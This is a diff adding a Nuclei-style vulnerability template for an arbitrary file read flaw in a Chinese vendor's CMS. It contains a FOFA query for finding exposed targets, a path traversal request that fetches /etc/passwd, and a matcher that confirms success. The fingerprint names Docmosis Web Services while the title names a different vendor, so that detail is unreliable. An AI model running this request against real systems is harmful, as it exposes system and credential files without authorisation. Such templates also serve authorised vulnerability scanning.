@@ -1,0 +1,25 @@
+id: longjuanfeng-cms-file-read
+
+info:
+  name: 龙卷风科技CMS任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="Welcome to Docmosis Web Services"
+    日期: 2024-04-30
+    该漏洞允许攻击者通过特定路径构造请求，绕过服务器端文件访问控制机制，实现对目标系统中任意文件的非授权读取。攻击者可利用此漏洞获取敏感配置文件、系统日志或可执行代码，进而可能引发横向渗透或权限提升风险。
+  tags: 龙卷风科技
+
+http:
+- raw:
+  - |
+    GET /api/../fetch?filename=/../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
